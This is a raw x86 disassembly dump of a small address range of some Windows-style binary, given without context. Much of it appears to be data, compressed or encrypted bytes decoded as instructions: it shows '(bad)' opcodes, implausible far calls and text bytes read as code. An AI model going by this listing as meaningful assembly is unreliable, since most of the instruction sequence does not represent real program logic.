  40aef9:	es cmp ah,cl
  40aefc:	ins    DWORD PTR es:[edi],dx
  40aefd:	jb     0x40af7d
  40aeff:	and    BYTE PTR [eax],al
  40af01:	add    BYTE PTR [eax],ah
  40af03:	jns    0x40aec9
  40af05:	add    BYTE PTR [eax],al
  40af07:	dec    eax
  40af08:	xor    esi,DWORD PTR [eax+0x0]
  40af0b:	add    BYTE PTR [ecx],cl
  40af0d:	add    BYTE PTR [ebx-0x2e],ah
  40af10:	mov    dl,BYTE PTR [ebp-0x402d95a5]
  40af16:	sub    al,0x3c
  40af18:	adc    al,0x87
  40af1a:	or     al,0xe2
  40af1c:	bound  eax,QWORD PTR [esp+eiz*8-0x74]
  40af20:	mov    ch,0x68
  40af22:	mov    bh,0x4d
  40af24:	add    BYTE PTR [eax],al
  40af26:	add    bh,dl
  40af28:	push   eax
  40af29:	add    BYTE PTR [eax],al
  40af2b:	mov    bh,0x56
	...
  40af39:	mov    al,BYTE PTR [esi+0x35]
  40af3c:	push   edx
  40af3d:	mov    ebx,0xf96fba94
  40af42:	cmp    edi,DWORD PTR [ebx-0xf9f3222]
  40af48:	(bad)  
  40af49:	fidiv  WORD PTR [ebp+eiz*8-0x73]
  40af4d:	fisub  DWORD PTR [eax+0x4040c80]
  40af53:	add    al,0x4
  40af55:	add    al,0x4
  40af57:	add    al,0x4
  40af59:	add    al,0x75
  40af5b:	jne    0x40af1a
  40af5d:	fst    st(1)
  40af5f:	fidiv  DWORD PTR [ebp+0x75]
  40af62:	sub    al,bh
  40af64:	and    cl,dl
  40af66:	fisttp DWORD PTR [ecx-0xe9ac277]
  40af6c:	repz or esp,DWORD PTR es:[edi*1-0x51d866bb]
  40af75:	jmp    0x40afdf
  40af77:	mov    WORD PTR [ecx],gs
  40af79:	xor    BYTE PTR [ebp+0x6b858877],0xee
  40af80:	mov    cl,0x3e
  40af82:	aam    0x60
  40af84:	xchg   edx,eax
  40af85:	jne    0x40affc
  40af87:	add    ebx,DWORD PTR [ebx+0x75]
  40af8a:	jne    0x40afb9
  40af8c:	call   0x5d5:0xe8753a
  40af93:	add    al,0xc
  40af95:	xchg   ebp,eax
  40af96:	sub    al,0xcf
  40af98:	or     ecx,ecx
  40af9a:	pop    esp
  40af9b:	mov    cl,0x7c
  40af9d:	nop    DWORD PTR [esi]
  40afa0:	retf   0x6fb5
  40afa3:	and    al,0xfe
  40afa5:	test   eax,0xe8e811de
  40afaa:	call   0x44050df2
  40afaf:	adc    ch,dh
  40afb1:	pop    ecx
  40afb2:	loope  0x40b029
  40afb4:	push   es
  40afb5:	jmp    0x40af56
  40afb7:	sbb    cl,BYTE PTR [esi]
  40afb9:	dec    esp
  40afba:	pop    es
  40afbb:	push   eax
  40afbc:	lods   eax,DWORD PTR ds:[esi]
  40afbd:	cmp    eax,0xf7f680d3
  40afc2:	inc    edi
  40afc3:	mov    esi,0x5536dc2f
  40afc8:	call   0x602f28b5
  40afcd:	call   0xcd0d98ba
  40afd2:	int3   
  40afd3:	int3   
  40afd4:	int3   
  40afd5:	int3   
  40afd6:	int3   
  40afd7:	int3   
  40afd8:	int3   
  40afd9:	shr    DWORD PTR [eax],1
  40afdb:	ret    0x0
  40afde:	add    BYTE PTR [eax],al
  40afe0:	add    BYTE PTR [eax],al
  40afe2:	add    BYTE PTR [eax],al
  40afe4:	add    bh,bh
  40afe6:	call   DWORD PTR [ebp+0x2]
  40afe9:	mov    bh,0xa3
  40afeb:	mov    cl,BYTE PTR [ebp+ebx*8+0x78]
  40afef:	add    esp,eax
  40aff1:	popf   
  40aff2:	ins    BYTE PTR es:[edi],dx
  40aff3:	xchg   ebp,eax
  40aff4:	and    DWORD PTR [eax+0x3b46e77d],ebx
  40affa:	mov    DWORD PTR [ecx+ebx*2],ebp
  40affd:	mov    esp,0xbfffff4b
  40b002:	push   esp
  40b003:	(bad)  
  40b004:	push   DWORD PTR [ecx+0x76ffffc2]
  40b00a:	jne    0x40b045
  40b00c:	(bad)  
  40b00d:	stos   BYTE PTR es:[edi],al
  40b00e:	cmp    BYTE PTR [eax],bl
  40b010:	lds    edx,FWORD PTR [edx+0x25]
  40b013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b014:	in     al,0xfb
  40b016:	mov    dl,0xa9
  40b018:	repnz or cl,BYTE PTR [esi+0x66e9a49e]
  40b01f:	push   edi
  40b020:	mov    ebp,0xb08900ff
  40b025:	and    DWORD PTR [edx+0x0],ebx
  40b028:	add    BYTE PTR [eax],al
  40b02a:	mov    DWORD PTR ds:0x6b1f0d11,edx
  40b030:	mov    bh,0xc9
  40b032:	push   ss
  40b033:	rol    DWORD PTR [ecx],cl
  40b035:	sbb    BYTE PTR [edi-0x332c223a],ch
  40b03b:	arpl   WORD PTR [eax+0x1e935f25],di
  40b041:	push   ss
  40b042:	sbb    ebp,DWORD PTR [edi]
  40b044:	test   al,0xf1
  40b046:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40b048:	outs   dx,DWORD PTR ds:[esi]
  40b049:	push   ebp
  40b04a:	dec    edi
  40b04b:	mov    al,ds:0xe5000045
  40b050:	dec    edx
  40b051:	add    BYTE PTR [eax],al
  40b053:	add    BYTE PTR [ebp+0x45],al
  40b056:	inc    ebp
  40b057:	inc    ebp
  40b058:	inc    ebp
  40b059:	inc    ebp
  40b05a:	inc    ebp
  40b05b:	inc    ebp
  40b05c:	inc    ebp
  40b05d:	retf   
  40b05e:	add    BYTE PTR [ecx-0x76767677],ah
  40b064:	mov    DWORD PTR [ecx+0x898989],ecx
  40b06a:	add    BYTE PTR [edi-0x27d82e52],cl
  40b070:	lock cwde 
  40b072:	or     dh,ch
  40b074:	push   es
  40b075:	in     al,0xfb
  40b077:	lahf   
  40b078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b079:	bound  edi,QWORD PTR [ecx]
  40b07b:	cmp    ecx,DWORD PTR [edi-0x3b0975cc]
  40b081:	mov    eax,0xe7
  40b086:	shr    DWORD PTR [ecx],1
  40b088:	iret   
  40b089:	xchg   ecx,eax
  40b08a:	lods   eax,DWORD PTR ds:[esi]
  40b08b:	cs in  al,dx
  40b08d:	mov    edi,0x33821d1a
  40b092:	arpl   WORD PTR [ecx+0x12],cx
  40b095:	lahf   
  40b096:	mov    ch,0x8d
  40b098:	sub    eax,0x9acfc4a0
  40b09d:	pop    es
  40b09e:	ret    
  40b09f:	sbb    dl,cl
  40b0a1:	pop    ebp
  40b0a2:	add    BYTE PTR [eax],al
  40b0a4:	data16 setge BYTE PTR [eax]
  40b0a8:	add    BYTE PTR [edi-0x30],bl
  40b0ab:	aad    0x0
  40b0ad:	call   0x57a4e90a
  40b0b2:	inc    esi
  40b0b3:	test   BYTE PTR [edx+ecx*2-0x1ab3b79d],cl
  40b0ba:	sbb    al,BYTE PTR [ecx+0x736f8b67]
  40b0c0:	popa   
  40b0c1:	ins    DWORD PTR es:[edi],dx
  40b0c2:	push   ebx
  40b0c3:	jae    0x40b0e7
  40b0c5:	ds addr16 push ebx
  40b0c8:	gs je  0x40b13d
  40b0cb:	gs jbe 0x40b13c
  40b0ce:	fs jo  0x40b11e
  40b0d1:	gs jb  0x40b136
  40b0d4:	jae    0x40b13b
  40b0d6:	gs jns 0x40b14c
  40b0d9:	inc    ecx
  40b0da:	outs   dx,BYTE PTR ds:[esi]
  40b0db:	jb     0x40b146
  40b0dd:	ins    DWORD PTR es:[edi],dx
  40b0de:	cmp    al,0x6c
  40b0e0:	or     dh,BYTE PTR [esi+0xa]
  40b0e3:	inc    ecx
  40b0e4:	sub    DWORD PTR [esi+0x6f],esp
  40b0e7:	cmp    ah,BYTE PTR [ecx+0x3c]
  40b0ea:	ds popa 
  40b0ec:	gs ins DWORD PTR es:[edi],dx
  40b0ee:	and    bh,BYTE PTR [eax+eiz*1]
  40b0f1:	jne    0x40b168
  40b0f3:	jae    0x40b15a
  40b0f5:	ins    DWORD PTR es:[edi],dx
  40b0f6:	ins    DWORD PTR es:[edi],dx
  40b0f7:	jae    0x40b162
  40b0f9:	and    BYTE PTR ds:0x4d797474,cl
  40b0ff:	je     0x40b121
  40b101:	and    BYTE PTR [ecx+0x65],ch
  40b104:	and    ah,BYTE PTR [ebp+0x6b]
  40b107:	arpl   WORD PTR [esi],bp
  40b109:	bound  esi,QWORD PTR [edx+0x69]
  40b10c:	imul   esi,DWORD PTR [ebx+0x6d],0x76725372
  40b113:	or     eax,0x654d3e67
  40b118:	cmp    al,0x57
  40b11a:	cs inc esp
  40b11c:	jne    0x40b13e
  40b11e:	outs   dx,BYTE PTR ds:[esi]
  40b11f:	cmp    al,0x20
  40b121:	jae    0x40b191
  40b123:	and    BYTE PTR [eax],ah
  40b125:	bound  esp,QWORD PTR [eax]
  40b127:	cs jo  0x40b161
  40b12a:	fimul  WORD PTR [esi-0x73]
  40b12d:	inc    ebx
  40b12e:	or     BYTE PTR [edi-0x18],ch
  40b131:	call   0xe85ff51e
  40b136:	call   0xe9299123
  40b13b:	call   0x74b525b4
  40b140:	je     0x40b1b6
  40b142:	je     0x40b1b8
  40b144:	je     0x40b19c
  40b146:	lds    ecx,FWORD PTR [ebx]
  40b148:	xchg   BYTE PTR [ebx+0x5a88b0c6],bh
  40b14e:	mov    BYTE PTR ds:0xa31e78b5,dh
  40b154:	mov    edi,0xf00451bf
  40b159:	dec    edi
  40b15a:	not    DWORD PTR [eax+0x45454587]
  40b160:	inc    ebp
  40b161:	inc    ebp
  40b162:	inc    ebp
  40b163:	inc    ebp
  40b164:	inc    ebp
  40b165:	inc    ebp
  40b166:	add    BYTE PTR [eax],al
  40b168:	dec    eax
  40b169:	and    eax,0x9431
  40b16e:	(bad)  
  40b16f:	cld    
  40b170:	fdivr  QWORD PTR [ebx+0x5]
  40b173:	inc    ebp
  40b174:	dec    esi
  40b175:	add    eax,0x86771109
  40b17a:	mov    esp,0xecdb1d40
  40b17f:	icebp  
  40b180:	(bad)  [edi]
  40b182:	xchg   esp,eax
  40b183:	or     eax,0xa71ca121
  40b188:	out    dx,al
  40b189:	fst    st(2)
  40b18b:	lock mov ds:0xc2ce55fe,al
  40b191:	add    BYTE PTR [eax],al
  40b193:	outs   dx,DWORD PTR ds:[esi]
  40b194:	jecxz  0x40b196
  40b196:	add    BYTE PTR [ebx+0x7500f405],bl
  40b19c:	out    dx,al
  40b19d:	gs das 
  40b19f:	jb     0x40b178
  40b1a1:	lea    eax,[edx+0x722b9128]
  40b1a7:	jne    0x40b176
  40b1a9:	mov    edx,0x82d870c
  40b1ae:	and    DWORD PTR [ecx-0x68],ecx
  40b1b1:	popf   
  40b1b2:	icebp  
  40b1b3:	cmc    
  40b1b4:	jne    0x40b22b
  40b1b6:	jne    0x40b143
  40b1b8:	in     eax,dx
  40b1b9:	not    DWORD PTR [edx]
  40b1bb:	and    esi,DWORD PTR [edi-0x1cbb9278]
  40b1c1:	into   
  40b1c2:	and    bh,bh
  40b1c4:	xlat   BYTE PTR ds:[ebx]
  40b1c5:	or     ecx,esp
  40b1c7:	imul   ebp,DWORD PTR [ebp+0x61],0x37734f59
  40b1ce:	or     al,0xb4
  40b1d0:	call   0x75ce0d86
  40b1d5:	jne    0x40b1d6
  40b1d7:	jge    0x40b18b
  40b1d9:	jne    0x40b250
  40b1db:	jne    0x40b166
  40b1dd:	mov    DWORD PTR [ecx-0x76767677],ecx
  40b1e3:	mov    DWORD PTR [ecx-0x72c8cd97],ecx
  40b1e9:	lea    ecx,[ebp-0x72727273]
  40b1ef:	lea    ecx,[ebp-0x7da27677]
  40b1f5:	mov    ch,0xd9
  40b1f7:	stos   BYTE PTR es:[edi],al
  40b1f8:	add    BYTE PTR [ebx],al
  40b1fa:	inc    ecx
  40b1fb:	xchg   esp,eax
  40b1fc:	fnstcw WORD PTR [esi]
  40b1fe:	(bad)  
  40b1ff:	out    dx,al
  40b200:	addr16 hlt 
  40b202:	ret    
  40b203:	dec    esp
  40b204:	xor    al,0xe6
  40b206:	pcmpeqd mm4,QWORD PTR cs:[esi+0x19]
  40b20b:	mov    DWORD PTR [ecx-0x7676f049],ecx
  40b211:	pop    edx
  40b212:	loop   0x40b19d
  40b214:	mov    DWORD PTR [ebx-0xa2bb41b],esp
  40b21a:	jnp    0x40b212
  40b21c:	mov    WORD PTR cs:[edi],gs
  40b21f:	neg    BYTE PTR [esi+0x5dcf3b6c]
  40b225:	pop    ss
  40b226:	sbb    DWORD PTR [edi],0xffffffa2
  40b229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b22a:	mov    dl,0x4d
  40b22c:	push   edx
  40b22d:	mov    DWORD PTR [eax],eax
  40b22f:	mov    dh,0xae
  40b231:	mov    ch,0x4a
  40b233:	add    BYTE PTR [eax],al
  40b235:	add    ah,dl
  40b237:	sub    al,0xe1
  40b239:	sbb    al,BYTE PTR [esp+edi*4-0xe736d1]
  40b240:	jae    0x40b22a
  40b242:	les    ecx,FWORD PTR [edx+0x67]
  40b245:	(bad)  
  40b246:	iret   
  40b247:	shr    DWORD PTR [ebp+0x4b],1
  40b24a:	test   DWORD PTR [esi],0x1117a045
  40b250:	retf   0x5ee8
  40b253:	adc    ah,bl
  40b255:	mov    dh,cl
  40b257:	ret    0x98
  40b25a:	add    BYTE PTR [ebx+0xf9],dl
  40b260:	inc    ebp
  40b261:	inc    ebp
  40b262:	inc    ebp
  40b263:	inc    ebp
  40b264:	inc    ebp
  40b265:	inc    ebp
  40b266:	inc    ebp
  40b267:	inc    ebp
  40b268:	inc    ebp
  40b269:	pop    esi
  40b26a:	rcl    cl,1
	...
  40b274:	add    BYTE PTR [ebp+0x75],dh
  40b277:	xor    esp,eax
  40b279:	or     BYTE PTR [esi-0x5c],ah
  40b27c:	mov    bh,0x38
  40b27e:	add    eax,0xe3026847
  40b283:	xchg   esp,eax
  40b284:	ror    BYTE PTR [ecx],0x7f
  40b287:	push   0x465de7f6
  40b28c:	add    al,0x12
  40b28e:	or     DWORD PTR [ebp+0x75],esi
  40b291:	test   BYTE PTR [edi+0x1cfa0b5f],0x97
  40b298:	push   ecx
  40b299:	jecxz  0x40b275
  40b29b:	ss je  0x40b30f
  40b29e:	leave  
  40b29f:	cdq    
  40b2a0:	mov    al,0x74
  40b2a2:	lods   al,BYTE PTR ds:[esi]
  40b2a3:	or     ch,bl
  40b2a5:	xor    eax,0x4bf5dd86
  40b2aa:	mov    cl,0xf0
  40b2ac:	(bad)  
  40b2ad:	xor    eax,0xec5f7575
  40b2b2:	stc    
  40b2b3:	jne    0x40b32a
  40b2b5:	out    dx,al
  40b2b6:	int3   
  40b2b7:	push   ebp
  40b2b8:	jne    0x40b245
  40b2ba:	call   0xb879:0x925b0fcf
  40b2c1:	ss mov dh,0x5a
  40b2c4:	ror    DWORD PTR [edx+0x819f021],cl
  40b2ca:	sub    al,0x95
  40b2cc:	jl     0x40b28e
  40b2ce:	stc    
  40b2cf:	push   esp
  40b2d0:	iret   
  40b2d1:	inc    eax
  40b2d2:	mov    ecx,DWORD PTR [ebx-0x74868375]
  40b2d8:	mov    eax,DWORD PTR [ebp+0x6a]
  40b2db:	mov    ecx,DWORD PTR [ebx+0x8b]
  40b2e1:	add    BYTE PTR [eax],al
  40b2e3:	add    BYTE PTR [eax],al
  40b2e5:	add    BYTE PTR [eax],al
  40b2e7:	nop
  40b2e8:	dec    esp
  40b2e9:	loop   0x40b270
  40b2eb:	inc    ebx
  40b2ec:	xchg   esi,eax
  40b2ed:	popa   
  40b2ee:	inc    edi
  40b2ef:	hlt    
  40b2f0:	lods   al,BYTE PTR ds:[esi]
  40b2f1:	mov    ds:0x958ad6dc,al
  40b2f6:	fwait
  40b2f7:	popf   
  40b2f8:	push   ss
  40b2f9:	ret    
  40b2fa:	ja     0x40b2ba
  40b2fc:	fld    DWORD PTR ds:[ebx+0x0]
	...
  40b308:	add    BYTE PTR [eax],al
  40b30a:	sub    eax,0x90b206
  40b30f:	add    BYTE PTR [ecx],dh
  40b311:	xor    ebx,ecx
  40b313:	jae    0x40b327
  40b315:	cli    
  40b316:	arpl   WORD PTR [ecx-0x4e],bx
  40b319:	stos   BYTE PTR es:[edi],al
  40b31a:	in     al,dx
  40b31b:	mov    ds:0xb6efdaed,eax
  40b320:	repnz rcr BYTE PTR [esi-0x20],1
  40b324:	cmovle esp,ecx
  40b327:	and    DWORD PTR [edx-0x578e10dd],ecx
  40b32d:	and    al,0xa2
  40b32f:	adc    edx,ecx
  40b331:	mov    ch,BYTE PTR [ebp+0x0]
  40b334:	add    ch,dh
  40b336:	mov    es,WORD PTR [eax]
  40b338:	add    BYTE PTR [edi],bh
  40b33a:	mov    dh,0x14
  40b33c:	add    BYTE PTR [ebx-0x3bb0e835],cl
  40b342:	jae    0x40b3b5
  40b344:	pop    ss
  40b345:	add    BYTE PTR [edi-0x31],dl
  40b348:	add    BYTE PTR [eax+0x4e3ebb63],0x79
  40b34f:	std    
  40b350:	std    
  40b351:	xor    al,0x4b
  40b353:	in     al,0x32
  40b355:	jle    0x40b2e2
  40b357:	mov    ecx,DWORD PTR [ebx-0x75af927]
  40b35d:	jecxz  0x40b357
  40b35f:	outs   dx,DWORD PTR ds:[si]
  40b361:	fdivr  st,st(7)
  40b363:	dec    esi
  40b364:	jbe    0x40b3c7
  40b366:	mov    dh,0xda
  40b368:	xlat   BYTE PTR ds:[ebx]
  40b369:	lahf   
  40b36a:	sub    edi,eax
  40b36c:	bound  edx,QWORD PTR [ecx]
  40b36e:	mov    edi,DWORD PTR [edi+0x31d8ef9b]
  40b374:	inc    ecx
  40b375:	mov    ecx,DWORD PTR ds:[ebx-0x74e3d04b]
  40b37c:	mov    ecx,DWORD PTR [ebx+0x0]
  40b382:	add    BYTE PTR [eax],al
  40b384:	add    BYTE PTR [eax],al
  40b386:	add    BYTE PTR [esp+esi*1+0x4040430],al
  40b38d:	add    al,0x4
  40b38f:	add    al,0x4
  40b391:	add    al,0x4
  40b393:	add    DWORD PTR [ebx-0x2169f65f],0x2d
  40b39a:	cmp    DWORD PTR [edi+0x72],esi
  40b39d:	data16 aaa 
  40b39f:	repnz inc ebx
  40b3a1:	repz and esi,ebx
  40b3a4:	gs dec edi
  40b3a6:	imul   ebp,DWORD PTR [ebp+edi*2-0x6e8a942f],0xffffff83
  40b3ae:	and    DWORD PTR ds:0x1f838385,0xffffffe1
  40b3b5:	add    DWORD PTR [ebx+0x3b37f567],0x2b
  40b3bc:	in     eax,dx
  40b3bd:	add    bl,BYTE PTR [ebx]
  40b3bf:	jae    0x40b359
  40b3c1:	cli    
  40b3c2:	and    al,0x55
  40b3c4:	ins    BYTE PTR es:[edi],dx
  40b3c5:	scas   al,BYTE PTR es:[edi]
  40b3c6:	sub    ah,BYTE PTR [ebp-0x123a7bee]
  40b3cc:	inc    ecx
  40b3cd:	mov    esi,0xec00831c
  40b3d2:	jnp    0x40b36a
  40b3d4:	xlat   BYTE PTR ds:[ebx]
  40b3d5:	add    BYTE PTR [eax],al
  40b3d7:	add    BYTE PTR [ebx-0x2722bd34],al
  40b3dd:	add    eax,ebx
  40b3df:	mov    cl,0x23
  40b3e1:	adc    DWORD PTR [edi-0x6c9b93e4],eax
  40b3e7:	retf   
  40b3e8:	dec    eax
  40b3e9:	and    bl,BYTE PTR [ebx]
  40b3eb:	into   
  40b3ec:	push   eax
  40b3ed:	cmc    
  40b3ee:	jmp    0x271a735c
  40b3f3:	dec    esi
  40b3f4:	(bad)  
  40b3f5:	jmp    0x8e1700c2
  40b3fa:	add    BYTE PTR ds:[eax],al
  40b3fd:	call   0x40b421
	...
  40b40a:	add    BYTE PTR [edx-0x15],cl
  40b40d:	ud0    edi,edi
  40b410:	(bad)  
  40b411:	(bad)  
  40b412:	(bad)  
  40b413:	(bad)  
  40b414:	(bad)  
  40b415:	(bad)  
  40b416:	inc    DWORD PTR [eax]
  40b418:	add    BYTE PTR [ebx-0x37],bh
  40b41b:	xchg   ebp,eax
  40b41c:	pop    ebx
  40b41d:	jl     0x40b420
  40b41f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b420:	into   
  40b421:	push   ss
  40b422:	dec    edi
  40b423:	ficom  WORD PTR es:[ebp-0x20]
  40b427:	idiv   ebx
  40b429:	cwde   
  40b42a:	ret    0xa326
  40b42d:	cmp    BYTE PTR [esi+0x7dd8],ah
  40b433:	dec    ebp
  40b434:	clc    
  40b435:	in     al,0x99
  40b437:	adc    dh,BYTE PTR [esi+ebp*2]
  40b43a:	arpl   WORD PTR [ebp+0x20],sp
  40b43d:	inc    ebx
  40b43e:	gs je  0x40b4ba
  40b441:	and    BYTE PTR [ebx+0x2e],al
  40b444:	dec    ebp
  40b445:	gs gs inc ebx
  40b448:	cs gs push ebx
  40b44b:	arpl   WORD PTR gs:[eax],sp
  40b44e:	ins    DWORD PTR es:[edi],dx
  40b44f:	or     bh,BYTE PTR ds:0x72707241
  40b455:	cmp    al,0x20
  40b457:	or     eax,0xd61734d
  40b45c:	ins    BYTE PTR es:[edi],dx
  40b45d:	arpl   WORD PTR ds:[eax],sp
  40b460:	gs jb  0x40b4d2
  40b463:	dec    ebp
  40b464:	gs jbe 0x40b487
  40b467:	cmp    al,0x74
  40b469:	ins    DWORD PTR es:[edi],dx
  40b46a:	gs ins BYTE PTR es:[edi],dx
  40b46c:	jo     0x40b48e
  40b46e:	inc    esp
  40b46f:	imul   esi,DWORD PTR [edx+esi*2+0x65],0x2041536e
  40b477:	je     0x40b4ba
  40b479:	jae    0x40b4e0
  40b47b:	outs   dx,BYTE PTR ds:[esi]
  40b47c:	cs dec ebp
  40b47e:	push   edi
  40b47f:	gs jb  0x40b4e5
  40b482:	jae    0x40b4f6
  40b484:	gs push edi
  40b486:	cmp    al,0x74
  40b488:	push   ebx
  40b489:	and    BYTE PTR [edx+0x20],ah
  40b48c:	arpl   WORD PTR [eax],sp
  40b48e:	bound  bp,DWORD PTR [edi+0x73]
  40b492:	imul   esi,DWORD PTR [esp+eax*2+0x44],0x204d7220
  40b49a:	or     ah,BYTE PTR [edx+0x67]
  40b49d:	inc    esp
  40b49e:	bound  esp,QWORD PTR gs:[ebp+0x70]
  40b4a2:	cmp    al,0x6c
  40b4a4:	and    BYTE PTR [ebp*2+0x329e793d],bh
  40b4ab:	int    0xed
  40b4ad:	lock xor eax,0xde14519e
  40b4b3:	mov    ecx,0x8a0fe625
  40b4b8:	xlat   BYTE PTR ds:[ebx]
  40b4b9:	shl    cl,cl
  40b4bb:	sub    BYTE PTR [eax+eax*2+0x103],al
  40b4c2:	rcl    BYTE PTR [ecx],cl
  40b4c4:	add    BYTE PTR es:[eax],al
  40b4c7:	mov    ecx,0xe800959a
  40b4cc:	(bad)  
  40b4cd:	fstp   TBYTE PTR [ecx+0x2]
  40b4d0:	jg     0x40b4be
  40b4d2:	repnz icebp 
  40b4d4:	sbb    BYTE PTR [edi],0xaf
  40b4d7:	shl    BYTE PTR [edx],1
  40b4d9:	push   0x98eae7ed
  40b4de:	lahf   
  40b4df:	and    eax,0x678e9c37
  40b4e4:	call   0x4dc89dd1
  40b4e9:	call   0xe91065d6
  40b4ee:	call   0x40b4db
  40b4f3:	(bad)  
  40b4f4:	(bad)  
  40b4f5:	(bad)  
  40b4f6:	(bad)  
  40b4f7:	(bad)  
  40b4f8:	call   edi
  40b4fa:	(bad)  
  40b4fb:	pushf  
  40b4fc:	lods   al,BYTE PTR ds:[esi]
  40b4fd:	shl    BYTE PTR [edi+0x5f159f70],1
  40b503:	and    bh,cl
  40b505:	inc    DWORD PTR [ecx]
  40b507:	pop    edx
  40b508:	ficomp WORD PTR ds:0x8f900043
  40b50e:	(bad)  
  40b50f:	lahf   
  40b510:	jmp    0x74b52989
  40b515:	je     0x40b58b
  40b517:	je     0x40b58d
  40b519:	je     0x40b49e
  40b51b:	or     DWORD PTR [esi],0xffffffda
  40b51e:	cli    
  40b51f:	add    DWORD PTR ds:[ebx+0x7b42d495],0x4b
  40b527:	push   esi
  40b528:	fdivr  st,st(5)
  40b52a:	sbb    esp,DWORD PTR [eax-0x6f]
  40b52d:	sti    
  40b52e:	leave  
  40b52f:	inc    ebx
  40b530:	mov    ch,0x33
  40b532:	call   0x7c88:0xd491f1cb
  40b539:	bound  edi,QWORD PTR [edx-0x30]
  40b53c:	xor    cl,BYTE PTR [esi]
  40b53e:	xchg   edi,eax
  40b53f:	xchg   edx,eax
  40b540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b541:	mov    bh,0xef
  40b543:	adc    al,0xe7
  40b545:	add    DWORD PTR [ebx-0x7c7cfc5e],0xffffffe9
  40b54c:	xadd   DWORD PTR [ebx-0x43421175],eax
  40b553:	add    DWORD PTR [esi-0x32d382dd],edi
  40b559:	mov    bh,0xcb
  40b55b:	fidivr DWORD PTR [ebx+0x2d166b56]
  40b561:	jo     0x40b5d4
  40b563:	adc    ebx,DWORD PTR [esi-0x4a]
  40b566:	sahf   
  40b567:	out    dx,al
  40b568:	mov    ecx,DWORD PTR [ebx+0x7eff0e8b]
  40b56e:	jp     0x40b52d
  40b570:	xchg   edi,eax
  40b571:	dec    ebx
  40b572:	add    DWORD PTR [ebx-0x3],ebp
  40b575:	fisttp QWORD PTR [edi+0x26]
  40b578:	mov    ebp,0x4043f88f
  40b57d:	xchg   esi,eax
  40b57e:	and    eax,DWORD PTR [ebx-0xd2aa151]
  40b584:	rcl    BYTE PTR [ebx],cl
  40b586:	lock test eax,0xc3eb8b8b
  40b58c:	xchg   edi,eax
  40b58d:	mov    ecx,DWORD PTR [ebx-0x72727275]
  40b593:	lea    ecx,[ebp-0x72727273]
  40b599:	loope  0x40b618
  40b59b:	inc    ebx
  40b59c:	call   0xe9299e89
  40b5a1:	call   0x1299e8e
  40b5a6:	add    ah,ch
  40b5a8:	or     ch,BYTE PTR [ecx+0x37]
  40b5ab:	adc    edi,DWORD PTR [ebx+0x165c4ffc]
  40b5b1:	add    al,0x84
  40b5b3:	mov    bh,0x14
  40b5b5:	icebp  
  40b5b6:	mov    ds:0x743826ce,eax
  40b5bb:	mov    cl,0xc4
  40b5bd:	std    
  40b5be:	mov    al,0x0
  40b5c0:	add    dh,cl
  40b5c2:	in     eax,0x0
  40b5c4:	add    BYTE PTR [esi+0x13],bh
  40b5c7:	add    BYTE PTR [eax],al
  40b5c9:	sbb    eax,0x36e11d55
  40b5ce:	je     0x40b562
  40b5d0:	jmp    0x6716ef3d
  40b5d5:	sub    eax,0xa68634e4
  40b5da:	ret    
  40b5db:	fwait
  40b5dc:	xchg   ecx,eax
  40b5dd:	adc    al,0x55
  40b5df:	mov    BYTE PTR ds:0x24c9ff00,dh
  40b5e5:	in     al,dx
  40b5e6:	push   ebp
  40b5e7:	(bad)  
  40b5e8:	(bad)  
  40b5e9:	jmp    ebp
  40b5eb:	cmc    
  40b5ec:	push   edx
  40b5ed:	bound  esp,QWORD PTR [ebp-0x51414b93]
  40b5f3:	fisttp WORD PTR [edi+0x4849a356]
  40b5f9:	push   eax
  40b5fa:	loop   0x40b5f9
  40b5fc:	icebp  
  40b5fd:	iret   
  40b5fe:	ja     0x40b5a2
  40b600:	add    cl,dl
  40b602:	jle    0x40b634
  40b604:	js     0x40b59a
  40b606:	(bad)  
  40b607:	mov    dh,0xee
  40b609:	push   DWORD PTR [esi-0x77]
  40b60c:	(bad)  
  40b60e:	jmp    FWORD PTR [ebp-0xec]
	...
  40b61c:	add    BYTE PTR ds:0x4042af7,bh
  40b622:	add    al,0x4
  40b624:	add    al,0x4
  40b626:	add    al,0x4
  40b628:	add    al,0x33
  40b62a:	xor    esp,DWORD PTR [eax]
  40b62c:	jbe    0x40b644
  40b62e:	inc    esp
  40b62f:	outs   dx,DWORD PTR ds:[esi]
  40b630:	push   0x1f941f0c
  40b635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b636:	dec    edi
  40b637:	mov    ebp,0x8337abb
  40b63c:	mov    ecx,DWORD PTR [edi+0xe93e6c0]
  40b642:	ret    
  40b643:	xor    esi,DWORD PTR [ebx]
  40b645:	jge    0x40b616
  40b647:	popa   
  40b648:	jg     0x40b6bb
  40b64a:	xchg   esi,eax
  40b64b:	or     DWORD PTR [ebp+0x79],esp
  40b64e:	push   esi
  40b64f:	cli    
  40b650:	ret    
  40b651:	repz aas 
  40b653:	pusha  
  40b654:	mov    esp,0xe6cc9c12
  40b659:	(bad)  
  40b65b:	sti    
  40b65c:	jge    0x40b673
  40b65e:	inc    ebp
  40b65f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b660:	xchg   edx,eax
  40b661:	xor    esi,DWORD PTR cs:[ebx]
  40b664:	inc    ebp
  40b665:	mov    ah,0xb1
  40b667:	xor    esi,DWORD PTR [ebx]
  40b669:	fstp   TBYTE PTR [eax-0x6e]
  40b66c:	xor    esi,DWORD PTR [ebp+0x7c]
  40b66f:	retf   
  40b670:	sar    BYTE PTR [edx+0x34227f35],1
  40b676:	je     0x40b6a1
  40b678:	mov    edi,0x6d02e472
  40b67d:	aaa    
  40b67e:	aaa    
  40b67f:	jl     0x40b660
  40b681:	call   0x7575:0xb93cfb5f
  40b688:	jne    0x40b706
  40b68a:	(bad)  
  40b68b:	jne    0x40b702
  40b68d:	int3   
  40b68e:	mov    WORD PTR [ebp+0x75],?
  40b691:	jne    0x40b693
	...
  40b69b:	mov    ecx,0x2e8dfc57
  40b6a0:	out    dx,eax
  40b6a1:	jb     0x40b625
  40b6a3:	xor    bh,BYTE PTR [edi+0x682612cd]
  40b6a9:	xchg   esi,eax
  40b6aa:	adc    ah,al
  40b6ac:	cmp    eax,0x3aa0bdcc
  40b6b1:	inc    ecx
  40b6b2:	lock add BYTE PTR [eax],al
	...
